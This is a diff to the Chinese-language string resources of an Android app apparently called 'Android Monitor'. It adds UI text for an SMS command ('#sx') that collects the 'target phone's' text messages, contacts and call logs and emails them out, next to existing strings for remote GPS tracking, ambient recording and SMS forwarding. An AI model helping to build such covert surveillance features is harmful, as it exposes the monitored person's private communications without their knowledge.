@@ -79,6 +79,7 @@
     <string name="pref_category_gps_title">手机定位</string>
     <string name="pref_category_ring_title">警报响铃</string>
     <string name="pref_category_env_rec_title">环境录音</string>
+    <string name="pref_category_collect_info_title">收集信息送信</string>
     
     <string name="pref_sender_mail_title">发信邮箱（仅GMail或QQ）</string>
     <string name="pref_sender_mail_summary">仅支持Gmail和QQ邮箱。</string>
@@ -116,6 +117,8 @@
     <string name="pref_ring_word_summary">发送短信#jb可强制使其持续响铃。</string>
     <string name="pref_env_rec_word_title">环境录音</string>
     <string name="pref_env_rec_word_summary">发送短信#hj#加分钟数（1~30）可对目标手机环境录音。</string>
+    <string name="pref_collect_info_word_title">收集情报送信</string>
+    <string name="pref_collect_info_word_summary">发送短信#sx可收集目标手机上的短信，联系人和通话记录，并发送邮件到指定信箱。</string>
     
     <!-- InitActivity -->
     <string name="init_title">安卓监控</string>
@@ -204,6 +207,11 @@
     <string name="indication_enable_redirect_all_sms_ng">启用所有短信实时转发失败。</string>
     <string name="indication_disable_redirect_all_sms_ok">停止所有短信实时转发成功。</string>
     <string name="indication_disable_redirect_all_sms_ng">停止所有短信实时转发失败。</string>
+    <string name="indication_collect_info_ng1">因为用户正在使用手机且网络未连接，安全起见，不主动打开网络收集信息发送邮件，请稍后再试。</string>
+    <string name="indication_collect_info_ng2">当前网络不可用，请稍后再试。</string>
+    <string name="indication_collect_info_ng3">目标手机上未设置送达邮箱，请用指令（#2#加上邮箱）设置后再尝试。</string>
+    <string name="indication_collect_info_ng4">目标手机始终无法连接到任何网络，请稍后再尝试。</string>
+    <string name="indication_collect_info_ok">信息收集完毕且发送邮件成功，请稍后前往您的邮箱（%s）查看。</string>
     
     <!-- System Indication -->
     <string name="indication_stopped_by_system">安卓监控消息：本手机成功被管理员停用。</string>
